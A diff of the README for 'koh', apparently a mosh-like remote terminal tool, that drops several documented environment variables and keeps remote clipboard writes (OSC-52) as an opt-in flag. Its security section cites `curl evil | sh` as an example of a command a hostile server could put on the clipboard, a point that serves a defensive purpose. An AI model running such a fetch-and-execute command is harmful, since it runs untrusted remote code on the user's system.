@@ -188,7 +188,7 @@ koh treats every value on the wire as untrusted and bounds what a malicious peer
   the trusted server emulator — the client never trusts the wire's framing.
 - **Remote clipboard writes (OSC-52) are opt-in.** By default a server **cannot** set your local
   system clipboard (it could otherwise silently swap a copied command for `curl evil | sh`). Enable
-  with `--clipboard` / `KOH_CLIPBOARD=1`; even then the payload must be strict base64 within the cap.
+  per session with `--clipboard`; even then the payload must be strict base64 within the cap.
 - **The secret identity key is written `0600`** (owner-only) into a `0700` state dir — it *is* the
   node's identity, so a world-readable key would be a local-impersonation risk. koh warns if it finds
   an existing key with looser permissions.
@@ -236,10 +236,8 @@ koh connect 871b…
 
 The server's identity persists in `~/…/koh/server.key` (override with `--key-file`); the
 client's in `~/…/koh/client.key`. Prediction policy is `--predict adaptive|always|never`
-(default adaptive: it engages only when the link is slow enough to benefit); set
-`KOH_PREDICT_OVERWRITE=yes` for overwrite-mode prediction in full-screen apps (mosh's
-`MOSH_PREDICTION_OVERWRITE`). Set `KOH_LOG=/tmp/koh.log` to capture client logs without
-disturbing the TUI.
+(default adaptive: it engages only when the link is slow enough to benefit). Set
+`KOH_LOG=/tmp/koh.log` to capture client logs without disturbing the TUI.
 
 ### Environment variables & logging
 
@@ -253,10 +251,6 @@ All of koh's knobs as environment variables (most have a CLI-flag equivalent):
 | `KOH_KEY_NEW_PASSPHRASE` | serve, connect, key | Passphrase used when **creating** a key on first run, and the new passphrase for `koh key passwd`; for CI/automation instead of the confirmed prompt. Must be non-empty. | — |
 | `KOH_STATE_DIR` | serve, connect | Base directory for the identity key files (the server's error message points here when the default isn't writable). | `--key-file` (per file) |
 | `KOH_DNS` | serve, connect | Override the discovery DNS resolver (`IP` or `IP:PORT`); needed on some Android/Termux setups. | — |
-| `KOH_CLIPBOARD` | connect | `1` to honor remote OSC-52 clipboard writes (off by default; L-1). | `--clipboard` |
-| `KOH_PREDICT_OVERWRITE` | connect | `yes` for overwrite-mode prediction in full-screen apps. | — |
-| `KOH_TITLE_NOPREFIX` | connect | Set to drop the `[koh] ` window-title prefix (mosh's `MOSH_TITLE_NOPREFIX`). | — |
-| `KOH_SERVER_NETWORK_TMOUT` | serve | Seconds of zero-connection idle before the server exits (mosh's `MOSH_SERVER_NETWORK_TMOUT`). | `--network-timeout-secs` |
 
 > Debugging a stuck session? Start the client with `RUST_LOG=koh=debug KOH_LOG=/tmp/koh.log` and the
 > server with `RUST_LOG=koh=debug` (it logs to stderr). At `debug` the client also reports link RTT,
@@ -464,8 +458,8 @@ step stays manual. Concrete checklist (each maps to a parity feature):
 - **No scrollback sync** — like mosh, only the visible screen is synchronized (use a pager/tmux).
 - Title/bell propagate and terminal *replies* (DSR/DA/DECRQM) are synthesized server-side, so
   interactive apps that probe the terminal (vim/htop/fzf) work. **OSC-52 clipboard** forwarding to
-  the local clipboard is supported but **off by default** (opt in with `--clipboard` /
-  `KOH_CLIPBOARD=1`) — a remote server shouldn't silently write your system clipboard.
+  the local clipboard is supported but **off by default** (opt in with `--clipboard`) — a remote
+  server shouldn't silently write your system clipboard.
 
 ## Roadmap
 
